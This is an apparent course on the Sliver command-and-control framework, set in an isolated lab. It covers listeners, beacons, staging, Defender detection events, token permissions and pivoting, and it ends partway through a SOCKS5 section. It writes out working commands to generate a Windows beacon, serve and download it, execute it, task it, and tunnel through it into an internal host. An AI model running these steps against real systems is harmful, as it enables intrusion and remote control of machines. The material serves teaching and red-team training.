docs.title: Lesson 2 — Components and Commands
docs.text: Goal: Identify Sliver's components, distinguish the operating-system terminal from the Sliver console, and explain what each basic command proves.

docs.title: The four roles
docs.text:
Component Responsibility Typical location Client Operator interface for entering requests and viewing results Operator's computer Server Central management of communication, tasks, and results Lab C2 server Listener Server-side service receiving implant communications Within the server Implant Program performing tasks on a lab target Lab target PC 
flowchart LR
    O["Operator"] --> C["Client console"]
    subgraph S["C2 server"]
        M["Server: task and connection management"] <--> L["C2 Listener"]
    end
    C <-->|"Operator management channel"| M
    L <-->|"C2 channel"| I["Implant on lab PC"]

There are two distinct communication paths: Client ↔ Server and Implant ↔ C2 Listener. A working operator connection does not prove that the target PC can reach the listener.

“Client” is also a generic networking word, but Sliver Client specifically names the operator-facing program. The implant is a separate component.

Supplement: Sliver can be controlled from its server console or through a separate client. These roles do not require four physical computers. Official architecture explanation

docs.title: Where to type commands
docs.text:
Interface Example command Interpreted by Linux terminal ./sliver-server Operating-system shell Sliver console jobs Sliver

The prompt is the text indicating that an interface is ready for input. It might look like ubuntu@lab:~$ in Linux or sliver > in Sliver. Do not copy the prompt itself. All command blocks below contain only the part to type.

docs.title: Opening a console
docs.text:
Lecture: The workshop provides an installed server and instructs learners to connect to its Ubuntu host using the lab's SSH key, then launch the Sliver client.

Supplement — local server example: If the Linux server binary is named sliver-server and is in the current directory, run this in the Linux terminal:

./sliver-server

./ means the executable is in the current directory. A successful launch presents the server console. This assumes a suitable, already-installed binary; the command is not an installer.

Supplement — preconfigured client example: If the server is already running and your operator configuration has been provided/imported, start the client from the Linux terminal:

./sliver-client

A separate client requires server connection and authentication settings. Starting the executable alone does not create that setup. The server must also be configured to accept operator connections. The workshop lab supplies this preparation; filenames and installation paths can vary. Official operator connection documentation

For the remaining examples, assume you have a working Sliver console through either route.

docs.title: Starting an HTTP listener
docs.text:
Lecture: The instructor starts an HTTP listener before generating the first beacon.

Supplement — illustrative example: Assume the isolated lab C2 server actually owns IP address 192.168.56.10. To receive HTTP implant communication on TCP port 8080, enter this in the Sliver console:

http --lhost 192.168.56.10 --lport 8080
Part Meaning http Start an HTTP listener --lhost Local server address on which to listen 192.168.56.10 Example IP assigned to the C2 server, not the target PC --lport Listening port option 8080 Example listening port

An IP/domain identifies the destination, a port identifies a communication endpoint, and a protocol specifies the communication rules. The address must exist on the server; the port must be available. Routing, firewall policy, and compatible implant settings also matter.

The listener command does not create, copy, or execute an implant. It prepares the server to receive communication. The syntax above was checked against the official listener command definitions.

docs.title: Inspecting server jobs
docs.text:
In the Sliver console:

jobs

Illustrative output — simplified, not captured from a running lab:

ID   Name   Protocol   Port
1    http   tcp        8080

This means a server job exists for the HTTP listener on TCP port 8080. It does not mean a target has connected. Opening a reception desk and receiving a visitor are different events.

Supplement — correction: The lecture describes jobs in terms of listening ports. More precisely, jobs are server-managed running activities, including listeners. Official job-list implementation

docs.title: Created builds versus communicating implants
docs.text:
Run these separately in the Sliver console:

implants

sessions

beacons
Command What it lists What it does not prove by itself implants Archived implant builds That the generated file is running on a target sessions Sessions managed by the server, with their status That every listed entry is currently healthy; inspect status beacons Registered beacons and their state That a past registration is still checking in; inspect timing

Lecture: implants lists generated implant builds. Compare it with sessions and beacons to distinguish created files from registered connections. Official build-list implementation

Stage What may be visible Listener started Listener in jobs Implant generated Build in implants File copied to target only No new session or beacon yet Implant executed and C2 registration succeeds Corresponding session or beacon information

Even after execution, an incorrect callback address, a blocked network path, or a stopped process can prevent successful communication. Creation → delivery → execution → communication are separate stages.

docs.title: Asking the installed version for help
docs.text:
help http

help jobs

Options and output can change between versions. Consult the installed console's help before relying on lecture-era syntax.

docs.title: Review questions
docs.text:
1. An HTTP listener appears in jobs. Does that prove an implant executed on the target?
  2. A build appears in implants, but there is no new session or beacon. Give one explanation that does not require a software error.
Answers and reasoning

1. No. It establishes only that the listener job is running. Target execution and communication remain unproven.

2. The file may have been generated or copied but never executed. Execution without successful communication is another possibility. The absence of a connection does not identify the cause on its own.

Continue to Lesson 3 — Sessions and beacons

docs.title: Lesson 3 — Sessions and Beacons
docs.text: Goal: Explain when a task reaches an implant, select the intended target, and distinguish scheduled waiting from execution and network delay.

docs.title: Two ways to exchange work
docs.text:
Lecture: A session supports interactive operation; a beacon checks in on a schedule to receive tasks.

Think of a session as a phone conversation: while the channel is working, requests can be delivered without waiting for a scheduled beacon check-in. “Interactive” does not mean zero latency; task execution and communication still take time.

Think of a beacon as a worker periodically checking an inbox. The operator can register a task on the server while the implant is waiting. The implant learns about that task when it next checks in, then performs it and returns results.

Aspect Session Beacon Interaction model Interactive task exchange Periodic task collection Task delivery Does not wait for the beacon schedule May wait until the next check-in Operator experience Relatively immediate interaction Request and result can be separated by waiting Key state to inspect Connection status Check-in times and task status

docs.title: A 30-second example
docs.text:
Illustrative example: Check-ins occur exactly every 30 seconds, with no jitter or network delay. These are teaching assumptions, not a claim about default settings.

t=00s  Beacon checks in. No task is waiting.
t=10s  Operator registers task A on the server.
       Task A waits on the server.
t=30s  Beacon checks in and receives task A.
       Task execution and result return follow.

The task waited 20 seconds before delivery. That does not mean execution took 20 seconds, and it does not promise that the result arrives at t=30s.

Real timing may include jitter, reconnect attempts, network delay, and the time needed to finish tasks. The official guide explains beacon tasking and check-in fields; the exact behavior and defaults depend on the version. Official guide

docs.title: List first, then select
docs.text:
In the Sliver console, list sessions or beacons:

sessions

beacons

For beacons, inspect the ID, hostname, username, last check-in, and next check-in information. A record remaining in the list does not guarantee that the process is still alive.

Select an existing session:

sessions --interact <Session_ID>

Or select an existing beacon:

beacons --interact <Beacon_ID>

Replace the placeholder, including its angle brackets, with the real identifier from your list. Selecting a beacon changes which target your console addresses; it does not convert the beacon into a session. These selection options are defined in the official session commands and official beacon commands.

Before assigning a task, verify the target hostname and execution user. The right command sent to the wrong machine is still a mistake.

docs.title: Three different sources of waiting
docs.text:
Period Reason Before task collection Waiting for the next check-in After task delivery Performing the requested work During communication Network transfer and processing

A delayed result does not automatically mean a network fault. First ask whether the task has reached its scheduled collection time.

docs.title: Corrections to common shortcuts
docs.text:
Supplement: The lecture contrasts continuous session traffic with quieter beacon traffic. Treat that as a simplification, not a guarantee.

  • An interactive session need not transmit large amounts of data all the time.
  • A beacon with frequent check-ins or large results can generate substantial traffic.
  • A beacon is not automatically undetectable. Repeated connections and associated endpoint behavior can provide evidence.

Learn the tasking and timing model first. Traffic volume and detectability depend on additional factors.

docs.title: Review questions
docs.text:
1. A beacon checks in every 60 seconds. A task is registered just after a check-in, and no response arrives within 10 seconds. Is that enough to diagnose a fault?
  2. Does beacons --interact <Beacon_ID> turn the selected beacon into a session?
Answers and reasoning

1. No. The main reason in this example is scheduled waiting. The beacon may not collect the task until its next check-in. Network delay is a separate possible contributor, not the primary explanation required by this timeline.

2. No. It selects a beacon for interaction. Selection and changing the communication mode are separate actions.

docs.title: Worked example: why the answer is 45 seconds
docs.text:
Assume check-ins occur at t=0s, t=60s, and t=120s. The operator registers a task at t=15s. Ignore jitter and network delay.

t=00s   Check-in
t=15s   Task registered
t=60s   Next check-in; task can be collected

Waiting time = 60 - 15 = 45 seconds

45 seconds is the waiting time until task collection. Execution and result-transfer time are additional. The result is not guaranteed to arrive after exactly 45 seconds.

Continue to Lesson 4 — Payloads, stagers, and loaders

docs.title: Lesson 4 — Payloads, Stagers, and Loaders
docs.text: Goal: Distinguish the code being delivered, the program performing C2 tasks, and the mechanisms used to prepare and start it.

docs.title: Payload versus implant
docs.text:
A payload is code intended to perform a particular function. The word has a broad meaning across security tools. In this course it often refers to implant code or the generated output that will be delivered and executed.

An implant is the program operating on the lab target and performing C2 tasks. The same software may be described as a payload when discussing delivery and as an implant when discussing its role on the target. However, not every payload is a C2 implant.

Term Main question Payload What code will be delivered or executed? Implant What program runs on the target and performs C2 work?

docs.title: Stageless: include the main program from the start
docs.text:
A stageless payload contains the full implant from the beginning. Think of an offline installer containing the application rather than a small installer that must retrieve the main package.

Deliver the full implant
          ↓
Run it on the lab PC
          ↓
Communicate with the C2 server

Stageless does not mean network-free. It removes the need to retrieve the main implant as a separate initial stage. The running implant still needs communication with the C2 server to receive remote tasks and return results.

docs.title: Staged: retrieve the next stage
docs.text:
A stager is a small initial program responsible for obtaining the next stage and arranging its execution. Think of a small online installer that fetches the application package.

flowchart LR
    A["Run stager on lab PC"] --> B["Request next-stage payload"]
    B --> C["Receive main payload"]
    C --> D["Start main payload"]
    D --> E["Implant performs C2 communication"]
Term Role Stage 1 Initial stage executed first Stage 2 Next stage obtained by the initial stage Stager Initial program focused on retrieving and starting another stage

Some designs have more stages. For now, use the two-stage model: initial program → main implant. Sliver's official staging explanation separates the staging server, the next-stage payload, and the stager. Official staging explanation

Aspect Stageless Staged Initially delivered Full implant output Initial stager Separate retrieval of main implant Not required Required in this model Initial output size Can be larger Can be smaller Possible failure points Execution and C2 communication Initial execution, retrieval, main execution, and C2 communication

A smaller initial program is not automatically undetectable. A stageless program is not automatically reliable either: incompatible platforms, blocked execution, or failed communication can still prevent it from working.

docs.title: Loader: prepare code for execution
docs.text:
A loader prepares code to run and transfers execution to it. Loading is also a normal operating-system and application concept; the word alone does not establish malicious activity.

In this course, a loader may read a payload from disk or retrieve it from a remote source, then prepare it for execution. It does not necessarily download from the internet or run only from memory.

Term Focus Payload What will run? Loader How will that code be prepared and started? Stager How will the next-stage code be obtained and started?

A stager can be understood as a loader specialized in next-stage delivery, although terminology varies between tools. The workshop's gen_loader is a separate training helper, not a universal built-in Sliver command.

docs.title: Delivery structure and communication mode are independent
docs.text:
Design question Choices How is the main implant provided at startup? Staged / stageless How does the running implant exchange tasks? Session / beacon

A stageless beacon contains the full implant from the start and then checks in periodically. A beacon does not inherently require a stager.

Similarly, providing the next-stage code and handling the running implant's C2 traffic are distinct functions. They can share infrastructure; this does not require a separate physical server or a different port in every design.

docs.title: Inspect the generation help
docs.text:
In the Sliver console:

help generate

help generate beacon

These commands display help. They do not generate an implant or execute anything on a target. Lesson 5 connects the generation options to the target operating system, CPU architecture, output format, and C2 address.

docs.title: Review questions
docs.text:
1. A stageless beacon does not need to download its main program. Does it therefore have no need to communicate with C2?
  2. A stager runs, but cannot retrieve the main payload. Does its successful startup prove the full implant ran?
  3. The main payload finishes downloading. Does that alone prove it executed?
Answers and reasoning

1. No. It still checks in to obtain remote tasks and return results. Main-program retrieval and ongoing C2 communication are different purposes.

2. No. The initial program ran, but the described execution chain stopped before the main payload could start. Starting an online installer is not the same as starting the application it would install.

3. No. Downloading, execution, C2 registration, and task completion are separate stages. A new beacon check-in supports the conclusion that the implant executed and communicated at that time. Check the last-check-in value rather than relying on an old list entry. Absence of a check-in does not itself prove non-execution: the program could have started but failed to communicate.

Continue to Lesson 5 — Reading a generation command

docs.title: Lesson 5 — Reading a Generation Command
docs.text: Goal: Explain which computer the generated program is intended to run on and which address it will contact.

docs.title: Lab roles and addresses
docs.text:
All commands below are examples for an authorized, isolated lab. The addresses are illustrative, not a claim that this environment has been deployed. Assume the operator uses the Sliver server console directly on Linux.

Computer Address Role Linux lab server 192.168.56.10 Sliver Server and C2 listener Windows lab PC 192.168.56.20 Runs the generated implant 
flowchart LR
    W["Windows lab PC: 192.168.56.20"] -->|"HTTP C2 communication"| L["Linux server: 192.168.56.10:8080"]

The program must run on Windows and contact the Linux server. Those are separate settings.

docs.title: Match the listener and callback
docs.text:
In the Sliver console, inspect the existing listeners:

jobs

If the intended listener is not already running, the example from Lesson 2 starts it:

http --lhost 192.168.56.10 --lport 8080

Do not try to start another listener on the same occupied address and port. The listener receives communication at 192.168.56.10:8080; the implant must be configured with a reachable callback endpoint matching that service.

docs.title: Read the full generation command
docs.text:
Enter this as one line in the Sliver console, after checking the installed version's help:

generate beacon --http http://192.168.56.10:8080 --os windows --arch amd64 --format exe --seconds 60 --jitter 0 --save ./lesson5-beacon.exe
Part Question answered Meaning in this example generate beacon What are we generating? A beacon implant --http http://192.168.56.10:8080 Where will it contact C2? The lab HTTP listener --os windows Which OS will run the implant? Windows --arch amd64 Which instruction-set architecture? x86-64 --format exe What output form? Executable --seconds 60 What base check-in interval? 60 seconds --jitter 0 Add random timing variation? None in this observation example --save ./lesson5-beacon.exe Where to save the result? The named file in the console application's current directory

The example is grounded in the official generation implementation and beacon generation implementation. Verify version-specific options with:

help generate beacon

docs.title: Target OS and CPU architecture
docs.text:
--os windows specifies the implant's execution target, not the operating system hosting Sliver Server. Building a program for another target platform is called cross-compilation. Actual build availability also depends on the tool and build environment.

Request a build from Linux
             ↓
Generate a Windows executable
             ↓
Run the result on the Windows lab PC

amd64 means x86-64 here; it is not restricted to AMD-branded processors. Compatible Intel processors can also use it. ARM64 is a different architecture: “64-bit” alone does not make the architectures interchangeable.

docs.title: Callback address versus download address
docs.text:
--http in the generation command configures the endpoint used by the running implant for C2. It is not the address at which Windows automatically downloads the generated file.

Address purpose Meaning File delivery Where Windows obtains the generated output C2 callback Where the running implant obtains tasks and returns results

Using --http does not itself make the output a stager. This example generates a complete beacon executable; the delivery of that executable is a later step.

docs.title: Where the output is saved
docs.text:
--save does not transfer the file to the target PC. It saves the returned output on the filesystem of the console application being used. With a server console, that is the server machine. With a separate client, it is the client side.

Therefore, saving ./lesson5-beacon.exe from the Linux server console does not place a file on the Windows desktop. Check the actual save-completion message for its location.

docs.title: Timing is a configuration, not a stopwatch guarantee
docs.text:
The example uses a 60-second base interval and zero added jitter to make the timeline easier to observe. Actual communication timing can still be affected by task processing, scheduling, and the network.

Also separate initial registration from subsequent periodic check-ins. The option does not mean the newly started implant must remain completely silent for its first 60 seconds.

docs.title: Verify what generation achieved
docs.text:
In the Sliver console:

implants

Check the build entry, the generation result, and the reported output path. Successful generation supports the conclusion that a build and output were produced. It does not prove delivery, execution, registration, recurring check-ins, or successful remote task completion.

docs.title: Review questions
docs.text:
1. Sliver Server runs on Linux and the target PC runs Windows. Which value belongs in --os?
  2. The server is 192.168.56.10 and the target is 192.168.56.20. Which belongs in this example's --http endpoint?
Answers and reasoning

1. windows. The option describes where the implant will execute.

2. http://192.168.56.10:8080. The implant contacts the C2 server's listener, not its own target-PC address.

Read the command as: “Build a Windows beacon executable that contacts the listener at 192.168.56.10:8080.” File delivery and target execution still come afterward.

Continue to Lesson 6 — Delivery, execution, and connection evidence

docs.title: Lesson 6 — Delivery, Execution, and Connection Evidence
Lesson 6 — Delivery, Execution, and Connection Evidence
docs.text: Goal: Follow the generated file to the lab target and distinguish evidence of a response, saved contents, execution, communication, and task completion.

docs.title: Two services, two purposes
docs.text:
Continue the isolated lab from Lesson 5: Linux server 192.168.56.10, Windows target 192.168.56.20, and the generated lesson5-beacon.exe.

Service Address Purpose Python file server 192.168.56.10:8000 Provide the executable to Windows Sliver C2 listener 192.168.56.10:8080 Exchange tasks and results with the running implant 
flowchart LR
    W["Windows lab PC"] -->|"1. Request file"| F["File server: 192.168.56.10:8000"]
    F -->|"2. Transfer executable"| W
    W -->|"3. Running implant contacts C2"| C["Sliver listener: 192.168.56.10:8080"]

Both services can use HTTP without being the same service. Download success is not C2 success.

docs.title: Prepare the file server on Linux
docs.text:
Use the generation output message to locate the file. Prepare a dedicated transfer folder containing only the intended lab file, then open a Linux terminal in that folder. This terminal is separate from the Sliver console.

First calculate the original file's SHA-256:

sha256sum ./lesson5-beacon.exe

Record the value for comparison. Then start the file server from that folder:

python3 -m http.server 8000 --bind 192.168.56.10

This serves files from the current directory on the specified interface and port. Keep the terminal open while serving the file. A dedicated folder limits which files are offered. Python's simple server is appropriate here as a temporary lab utility, not production hosting. Python documentation

docs.title: Download on the Windows target
docs.text:
Open PowerShell in a dedicated lab folder on Windows. The relative output path below refers to that folder.

Invoke-WebRequest -Uri "http://192.168.56.10:8000/lesson5-beacon.exe" -OutFile ".\lesson5-beacon.exe" -UseBasicParsing
Part Meaning Invoke-WebRequest Make the HTTP request -Uri Address of the file to retrieve -OutFile Local output file .\ Current Windows directory -UseBasicParsing Use basic parsing, including compatibility with Windows PowerShell

The command saves content; it does not automatically execute the saved program. Microsoft documentation

docs.title: What HTTP 200 does and does not prove
docs.text:
An illustrative, simplified file-server record might look like this:

192.168.56.20 ... "GET /lesson5-beacon.exe HTTP/1.1" 200 -

GET identifies the request method, the path identifies the requested resource, and 200 is the successful HTTP response status. This supports the conclusion that the server handled the request with a success response.

It does not prove that Windows saved the entire file. Transfer can be interrupted after a response begins, a local write can fail, or a security product can quarantine the file. It also proves neither execution nor a beacon check-in.

docs.title: Compare the saved contents
docs.text:
In Windows PowerShell:

Get-FileHash -LiteralPath ".\lesson5-beacon.exe" -Algorithm SHA256

Compare the hash with the original Linux SHA-256. Letter case in the hexadecimal display does not matter.

Result Interpretation Hashes match Strong evidence that the two files have the same contents Hashes differ Investigate a different file, changed contents, or a transfer problem

A hash is often called a digital fingerprint. A matching hash establishes content agreement; it is not a safety verdict or evidence of execution. Microsoft file-hash documentation

docs.title: Execute and inspect check-ins
docs.text:
In the Sliver console, confirm the intended C2 listener is running:

jobs

When the file is present and the authorized lab is ready for execution, start it from Windows PowerShell:

.\lesson5-beacon.exe

Execution can be blocked or followed by quarantine. If that occurs, record the path, detection time, threat name, and action. Treat it as an observed lab outcome and examine the protection records; Lesson 7 explains how to read them.

Back in the Sliver console:

beacons

Check the expected hostname and user, whether a new beacon registered, and whether its last-check-in value continues to update. An old list entry is not sufficient evidence of current communication. Official beacon commands

docs.title: Verify a simple task
docs.text:
Select the actual beacon in the Sliver console:

beacons --interact <Beacon_ID>

Replace the placeholder and angle brackets with its real ID. Then request its working directory:

pwd

Here pwd is a Sliver task for the selected target's working directory, not a Linux-terminal command for the operator's own directory. A beacon may wait until the next check-in to collect it. Receiving its result confirms this task's registration → delivery → execution → result return. It does not establish that every possible capability works. Official filesystem commands

docs.title: Evidence ladder
docs.text:
Observation Supported conclusion Server-side HTTP 200 record The request received a successful response status File exists on Windows A file is present at that path SHA-256 matches the original Strong evidence of matching saved contents New beacon check-in The implant executed and communicated at that time Repeated check-in updates Communication continued at later observed times pwd result returned This task was delivered, performed, and returned

Each observation has a practical limit. Do not substitute an earlier step's evidence for a later step's success.

docs.title: Review questions
docs.text:
1. The file server records HTTP 200. Does that prove the implant executed and connected to C2?
  2. The complete beacon executable has been downloaded, started, and is checking in. Must stopping only the Python service on port 8000 also stop its C2 communication on port 8080?
Answers and reasoning

1. No. The response status is not proof of complete local saving, execution, or C2 communication. Inspect the saved file and hash, then fresh check-ins and task results for their respective stages.

2. No, in this setup. The file-provision service and the C2 listener are separate. The stageless executable already contains the implant and no longer needs that initial download service. Stopping only port 8000's service need not stop communication with the independently running listener on port 8080.

Continue to Lesson 7 — Antivirus, EDR, and detection evidence

docs.title: Lesson 7 — Antivirus, EDR, and Detection Evidence
Lesson 7 — Antivirus, EDR, and Detection Evidence
docs.text: Goal: Distinguish detection from execution, and a detection record from a successful protective action.

docs.title: Start with an observation
docs.text: Imagine the file request succeeded, but the file is missing when you try to execute it and no beacon appears. Do not immediately conclude the download failed. A security product might have detected and quarantined the file after delivery. Investigate evidence for each step.

docs.title: Antivirus and EDR overlap
docs.text:
AV means antivirus. It detects threats and can perform protective actions such as blocking, quarantining, or removing them.

EDR means Endpoint Detection and Response. An endpoint is a device such as a PC or server. EDR helps investigate related device activity and respond to threats.

Capability Main perspective Antivirus Assess files or behavior and perform protection actions EDR Connect endpoint activity into an investigation and support response

These are overlapping capabilities, not a strict division between “AV sees files” and “EDR sees behavior.” Microsoft Defender Antivirus also monitors process, file, and service activity while software runs. Microsoft behavior-monitoring explanation

docs.title: Static inspection and runtime behavior
docs.text:
Static analysis examines code without executing that code. Relevant evidence can include known hashes, code patterns, file structure, embedded strings, and signing information.

Therefore, a file can be detected without the learner launching it. A downloaded or newly saved file may be inspected before manual execution.

Runtime analysis asks what the program does: which processes it starts, where it connects, which files it accesses, and what system changes occur. Actual products combine multiple approaches, including machine learning and cloud-based analysis. A pre-execution alert does not by itself identify the exact detection mechanism. Microsoft Defender Antivirus overview

docs.title: A clue is not a proven detection cause
docs.text:
Go-related file characteristics or Sliver-related strings can be useful analysis clues. However, these are different statements:

  • “The file contains a Sliver-related string.”
  • “The security product detected the file specifically because of that string.”

The first is an observation; the second requires additional validation. Go is also used by legitimate software. A language, a filename, or one string does not by itself establish maliciousness or explain a product's decision.

docs.title: Correlate endpoint activity
docs.text:
flowchart LR
    A["PowerShell download"] --> B["Executable saved"]
    B --> C["New process starts"]
    C --> D["Network communication"]
    D --> E["Later file or system activity"]

An analyst checks whether these events involve the same computer, user, process, file, and time window. Collected activity information is called telemetry.

EDR can connect such evidence to alerts and investigations, but it is not guaranteed to record every action. Product capabilities and configuration affect visibility. Microsoft EDR overview

docs.title: Detection, action, and outcome are separate
docs.text:
Ask three questions:

  1. What was detected?
  2. What action was taken?
  3. What was the action's outcome?

Microsoft Defender Antivirus provides useful examples:

Event ID Meaning What to inspect 1116 Malware or potentially unwanted software detected Threat name, path, detection details 1117 An action concerning a detected threat was recorded Actual action, status, and result

1116 does not prove successful quarantine. Nor does the number 1117 mean “quarantine succeeded.” Read whether the action was quarantine, removal, allowance, or another action, and inspect its reported state. Match it to the relevant file and threat. Microsoft event reference

docs.title: Read the events in PowerShell
docs.text:
Run this in Windows PowerShell on the lab PC, not in the Sliver console. It retrieves up to 20 matching events from the past hour:

Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 1116, 1117
    StartTime = (Get-Date).AddHours(-1)
} -MaxEvents 20 | Format-List TimeCreated, Id, Message
Part Meaning Get-WinEvent Read Windows event records LogName Select the event log Id Select the event IDs StartTime Select the start of the time window -MaxEvents 20 Retrieve up to 20 matching events Format-List Display the timestamp, ID, and message as a list

This reads records; it does not change protection settings or restore quarantined content. Log permissions can restrict access. No matching records in this query do not prove no detection ever happened: the time window and selected IDs limit the search. Get-WinEvent documentation

The same log can be opened in Event Viewer under Applications and Services Logs → Microsoft → Windows → Windows Defender → Operational.

docs.title: Reconstruct a timeline
docs.text:
Illustrative example:

10:00:00  File server logs an HTTP 200 response
10:00:02  Defender records detection of the executable
10:00:03  Defender records quarantine of that file
10:00:05  Execution attempt reports the file is missing

If the path, threat identifiers, and action result match, this supports “quarantine after delivery prevented this later file execution.” Events being close in time alone are not enough to prove they concern the same file.

docs.title: Review questions
docs.text:
1. A file was downloaded but never manually executed. Can antivirus still detect it?
  2. Only a matching 1116 event has been found. Does that establish successful quarantine?
Answers and reasoning

1. Yes. Inspection of hashes, code or string patterns, and other file characteristics can occur without manual execution. An observed string remains a clue, not proof that it caused the detection.

2. No. It establishes a detection record. Find the related action evidence, confirm the file and threat match, and inspect the actual action and outcome. Even 1117 must be read rather than interpreted solely by its event number.

Next: Identity, tokens, and permissions

docs.title: Lesson 8 — Identity, Tokens, and Permissions
docs.text:
Goal: Explain why an administrator account, an elevated process, and access to a particular resource require separate evidence.

Supplement: This lesson expands the permission questions discussed during study. Commands and simplified examples describe an authorized lab.

docs.title: A file becomes a process when it runs
docs.text:
An implant executable on disk is a file. When it executes, the operating system creates a process. A PID, or process ID, identifies that running process at that time. The same file can produce multiple processes, and an operating system can reuse a PID after a process exits.

The account associated with a process helps explain its identity. Its effective security context and the target resource's security rules determine whether a particular action is permitted.

flowchart LR
    A["Executable file"] -->|Execution| B["Process / PID"]
    B --> C["Effective security context"]
    C --> E["Access decision"]
    D["Resource permissions and policy"] --> E

docs.title: Read identity information in Sliver
docs.text:
In the Sliver console, inspect the target selected in an earlier lesson:

info
help whoami
whoami

info displays session or beacon information held by the server, including identity, PID, OS, and connection metadata. It is useful context; it does not perform a complete, fresh audit of every permission. Treat displayed metadata according to when and how it was collected. Sliver info implementation

whoami concerns the selected implant's identity; it is not the operator's local terminal command. Check the installed version's help and read its actual output. An account name alone does not establish token elevation, every group attribute, or access to a remote server. A beacon task may also require waiting for a check-in and the returned result.

docs.title: What an access token describes
docs.text:
In Windows, an access token describes a process or thread's security context. It includes the account identity, group information, and privileges. A thread can also impersonate another security context, so advanced investigations may need to inspect both process and thread context. Microsoft: Access tokens

For this introduction, keep three questions separate:

Question Example evidence Which account is this? Account name and SID With what effective context is this action running? Token elevation, enabled groups and privileges, integrity level May it perform this action on this resource? Relevant access controls and policy, or an appropriately scoped test

docs.title: An administrator account can run an unelevated process
docs.text:
With UAC and Admin Approval Mode, a member of the local Administrators group commonly runs ordinary applications using a filtered token. An approved elevation uses the administrative token. Account membership alone does not tell you which context an implant is using. Microsoft: How UAC works

Illustrative example:

Observation What it establishes What remains unknown LAB\student belongs to local Administrators Account membership Whether the implant is elevated An ordinary editor runs as LAB\student Process identity Whether it has an administrative token An explicitly elevated editor runs as the same user Same account can have a different process context What each particular file permits

Even a correctly identified elevated process does not imply unlimited access. Resource permissions and other controls still matter. Likewise, local administrator status on one machine does not automatically grant administrator access to another server.

docs.title: Reading does not establish writing or deletion
docs.text:
Suppose the implant successfully reads report.txt. The result supports that the read operation succeeded in the context used for that operation. It does not establish that the process can replace or delete the file.

Action Separate question List a directory May this context enumerate that directory? Read a file May it read this file's contents? Write or replace a file May it modify the contents or replace the object? Delete a file Do the relevant file or parent-directory rights permit deletion?

An ACL, or access control list, describes access rules for an object. A folder and the files inside it can have different effective permissions. Successful reading leaves writing and deletion unproven; it does not prove they are forbidden either. Record the evidence as “read succeeded; write/delete not assessed.”

Avoid treating an unnecessary destructive test as a permission check. Use a lab-owned disposable object when an exercise explicitly requires testing modifications.

docs.title: Worked interpretation
docs.text:
Observed: Account belongs to local Administrators.
Observed: Implant returned the contents of a lab file.
Unknown: Implant token elevation.
Unknown: Permission to modify or delete that file.
Unknown: Authentication and authorization on another server.

The correct conclusion stays within those observations. This is the same reasoning used earlier for HTTP 200, beacon check-ins, and Defender events: each observation establishes a particular stage or capability.

docs.title: Review questions
docs.text:
1. The implant's account belongs to Administrators. Does that prove the implant is elevated?
  2. The implant reads a file successfully. Does that prove it can overwrite or delete it?
Answers and reasoning

1. No. Membership describes the account. UAC can give a process under that account a filtered context. Inspect the effective context used for the action before claiming administrative execution.

2. No. Read, write, replacement, and deletion are distinct operations. The successful read establishes only that operation. The other rights remain unknown until supported by appropriate evidence.

Previous: Antivirus and EDR · Next: Port forwarding and SOCKS5

docs.title: Lesson 9 — Port Forwarding and SOCKS5
docs.text:
Goal: Reach a lab service through an implant host, and distinguish a fixed TCP forward from a SOCKS5 proxy.

Supplement: These worked examples expand the networking discussion. The next lesson applies both techniques to an internal SSH server.

docs.title: Three separate gates
docs.text:
Gate Question What passing it does not establish Reachability Can this machine connect to the destination service? Valid login credentials Authentication Does the service accept this identity? Permission for every operation Authorization May this identity perform the requested operation? Unlimited access elsewhere

Pivoting uses an intermediate host's connectivity. The host must already have a permitted route to the destination. A tunnel does not supply missing credentials or create a network route that the intermediate host lacks.

Sliver's portfwd and socks5 carry application connections through an existing C2 channel. The separate pivots feature concerns implant-to-implant C2 connectivity; it is not a synonym for either command.

docs.title: Example hosts and preparation
docs.text:
Role Address Assumption Operator and Sliver console 192.168.56.10 Linux; Client and Server run on this VM Intermediate implant host 192.168.56.20 Windows; permitted path to the internal host Internal test service 10.20.0.15:8000 Linux; a dedicated lab HTTP server

Routing and firewall rules are prepared before these commands. The operator cannot connect directly to the internal service; the intermediate host can. Addresses alone do not enforce that separation.

On the internal Linux VM's console, in a dedicated folder containing only test material:

printf '%s\n' 'INTERNAL LAB OK' > index.html
python3 -m http.server 8000 --bind 10.20.0.15

This creates the lab page and serves that directory. Keep the terminal open. On the Windows intermediate VM's PowerShell, check the single intended destination:

Test-NetConnection -ComputerName 10.20.0.15 -Port 8000

TcpTestSucceeded: True supports TCP reachability from that host at that time. It does not establish HTTP content, authentication, or permissions inside an application.

docs.title: Use an interactive session
docs.text:
The checked Sliver command definitions restrict these portfwd and socks5 commands to Sessions. Start by checking your installed help:

help portfwd
help socks5
sessions

If a live session already exists, select its actual ID:

sessions --interact <Session_ID>

Replace angle-bracket placeholders with values from your console; do not type the brackets. If you currently have only a beacon, select it and request an additional interactive session:

beacons
beacons --interact <Beacon_ID>
interactive

Wait for the task to be collected and a new session to connect. Then list and select that new session with sessions and sessions --interact <Session_ID>. Selection alone does not change a beacon into a session. The new connection also depends on a working listener and supported C2 settings. Sliver session commands

docs.title: Port forwarding: fix the destination in advance
docs.text:
flowchart LR
    A["Operator: curl"] --> B["Local TCP listener<br/>127.0.0.1:18080"]
    B --> C["Existing Sliver channel"]
    C --> D["Intermediate implant"]
    D --> E["Fixed destination<br/>10.20.0.15:8000"]

In the Sliver console with the intermediate host's session selected:

portfwd add --bind 127.0.0.1:18080 --remote 10.20.0.15:8000
portfwd
Argument Meaning --bind 127.0.0.1:18080 Listen on loopback port 18080 on the machine running the Sliver console --remote 10.20.0.15:8000 Have the selected implant connect to this fixed destination

The forward is TCP; the application still speaks HTTP. portfwd lists forwarding entries, including their IDs. A listed entry establishes a configured listener, not successful communication with the final service. Command flags, client-side listener implementation

Open a separate Linux terminal on the operator VM:

curl --noproxy "*" --max-time 10 -i http://127.0.0.1:18080/

--noproxy "*" avoids an environment-configured HTTP proxy for this test. --max-time 10 limits the total attempt to ten seconds, and -i displays response headers. A response containing the expected INTERNAL LAB OK body supports end-to-end delivery of this request through the forward. A timeout still needs diagnosis; it does not identify the failed component by itself.

Here, 127.0.0.1 means the operator VM, not the implant. If the Client runs on a different machine from the Server, run the application on the Client machine where this listener was created.

docs.title: SOCKS5: the application requests a destination
docs.text:
flowchart LR
    A["Proxy-aware application<br/>requests 10.20.0.15:8000"] --> B["Local SOCKS5 listener<br/>127.0.0.1:1080"]
    B --> C["Existing Sliver channel"]
    C --> D["Intermediate implant"]
    D --> E["Requested destination<br/>10.20.0.15:8000"]

In the Sliver console, with the same live session selected:

